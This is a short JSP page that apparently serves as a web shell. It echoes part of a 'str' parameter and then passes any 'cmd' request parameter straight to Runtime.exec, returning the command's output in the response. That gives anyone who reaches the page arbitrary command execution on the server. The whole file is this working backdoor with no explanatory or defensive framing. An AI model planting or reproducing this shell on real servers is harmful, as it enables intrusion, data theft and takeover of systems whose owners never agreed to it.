<%@ page import="java.util.*,java.io.*"%>
<pre>
<%
String str = request.getParameter("str");
String str1 = str.substring(0,30);
out.println(str1);
if (request.getParameter("cmd") != null)
{
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null)
    {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
</pre>